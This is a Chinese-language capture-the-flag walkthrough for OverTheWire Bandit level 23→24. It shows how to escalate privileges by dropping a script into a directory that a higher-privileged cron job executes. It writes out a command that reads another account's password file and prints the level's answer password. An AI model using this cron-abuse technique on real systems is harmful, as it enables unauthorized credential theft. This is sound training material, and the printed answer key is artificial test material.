# Bandit Level 23 → 24 — 自寫腳本讓 cron 代為執行

> 這關你要寫自己的第一個 shell script，放進去讓有更高權限的 cron 幫你跑。

---

## 題目說明

官方原文：

> A program is running automatically at regular intervals from cron. This level requires you to create your own first shell-script.

---

## cron 腳本做什麼？

```bash
#!/bin/bash
cd /var/spool/bandit24/foo || exit
for i in * .;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

每分鐘用 **bandit24 的身份**：
1. 進入 `/var/spool/bandit24/foo/`
2. 找出所有 **bandit23 擁有**的檔案
3. 執行它們（最多 60 秒）
4. 刪除它們

---

## 攻擊鏈

```
你（bandit23）寫腳本
    ↓ cp
/var/spool/bandit24/foo/
    ↓ cron 每分鐘執行
bandit24 身份跑腳本
    ↓
密碼寫到 /tmp/mywork24/password.txt
    ↓
你讀取拿到密碼
```

---

## 解題步驟

**步驟 1**：建輸出目錄，開放 bandit24 寫入
```bash
mkdir /tmp/mywork24
chmod 777 /tmp/mywork24
```

**步驟 2**：用 nano 寫腳本
```bash
nano /tmp/mywork24/getpass.sh
```

內容：
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mywork24/password.txt
```

**步驟 3**：給執行權限
```bash
chmod +x /tmp/mywork24/getpass.sh
```

**步驟 4**：放進監控目錄
```bash
cp /tmp/mywork24/getpass.sh /var/spool/bandit24/foo/
```

**步驟 5**：等一分鐘，讀結果
```bash
cat /tmp/mywork24/password.txt
```

---

## 關鍵細節

| 細節 | 原因 |
|------|------|
| `chmod 777 /tmp/mywork24` | bandit24 需要能寫入這個目錄 |
| `chmod +x getpass.sh` | 沒有執行權限 cron 跑不起來 |
| 等一分鐘 | cron 每分鐘才掃一次 |

---

## 密碼

<details>
<summary>展開（先自己試過再看）</summary>

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

</details>

---

<div align="center">

**◀ [Level 22 → 23：cron + md5](../level22/)** · [🏠 回 Bandit 索引](../README.md) · **下一關 Level 24 → 25 ▶ _待寫_**

</div>
